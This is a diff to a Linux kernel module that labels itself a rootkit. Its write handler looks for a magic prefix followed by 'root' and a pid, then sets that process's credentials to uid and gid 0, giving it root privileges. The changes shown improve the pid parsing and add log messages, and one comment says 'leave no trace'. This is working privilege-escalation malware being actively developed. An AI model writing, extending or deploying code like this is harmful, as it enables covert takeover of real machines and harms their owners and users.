@@ -15,6 +15,7 @@
 #include <linux/sched.h>		/* for task and pid related operations */
 #include <asm/current.h>		/* for definition of 'current' (the current task) */
 
+#include <linux/gfp.h>
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("me");
@@ -123,7 +124,7 @@ static ssize_t trivial_write(struct file *f, const char *buff, size_t len, loff_
 
 	privBuf = (char *) kmalloc(len+1, GFP_KERNEL);	// allocate normal kernel RAM
 	if (privBuf == NULL) {
-		printk(KERN_ALERT "ROOTKIT: failed to allocate kernel buffer");
+		printk(KERN_INFO "ROOTKIT: failed to allocate kernel buffer");
 		return len;
 	}
 
@@ -134,15 +135,15 @@ static ssize_t trivial_write(struct file *f, const char *buff, size_t len, loff_
 	if (memcmp(privBuf, magic, 3) == SUCCESS) {
 		cmdPtr = &privBuf[3];			// cmdPtr should now be the given command
 
-		/* case root access to a process- number after command indicates pid, 0 indicates itself */
+		/* case root access to a process- number after command indicates pidf */
 		if (strncmp(cmdPtr, "root", 4) == SUCCESS) {
-			int pid = cmdPtr[4];
-			if (pid != '\0') {
-				pid = ASCIINUM_TO_DEC(pid);
+
+			cmdPtr = &cmdPtr[4]; 		// the beginning of the pid given
+			if ((*cmdPtr) != '\0') {
+				/* see man strtol for arguments */
+				int pid = (int) simple_strtol(cmdPtr, NULL, 10);
 				give_root(pid);
 			}
-			
-
 		}
 	}
 	kfree(privBuf);		// leave no trace
@@ -163,14 +164,16 @@ static struct task_struct *find_task_from_pid(int pid) {
 	struct pid *task_pid;
 	task_pid = find_vpid(pid);
 	if (task_pid == NULL) {
+		printk(KERN_INFO "Did not find task from given pid\n");
 		return NULL;
 	}
 	/* use the pid struct to find the task struct */
-	struct task_struct *task;
+	struct task_struct *task = NULL;
 	task = pid_task(task_pid, PIDTYPE_PID);
 	return task;
 }
 
+/* change a given credential struct to root privileges */
 static void root_creds(struct cred *c) {
 	c->uid.val = 0;
 	c->gid.val = 0;
@@ -190,9 +193,6 @@ static void give_root(int pid) {
 	struct task_struct *task;
 	if (pid == 0) {
 		task = current;
-		//struct cred *new = prepare_creds();
-		//root_creds(new);
-		//commit_creds(new);
 	} else {
 		task = find_task_from_pid(pid);
 		if (task == NULL) {
@@ -201,6 +201,7 @@ static void give_root(int pid) {
 	}
 	root_creds(task->cred);
 	root_creds(task->real_cred);
+	printk(KERN_INFO "ROOTKIT: Adjusted credentials for given pid\n");
 }
 
 
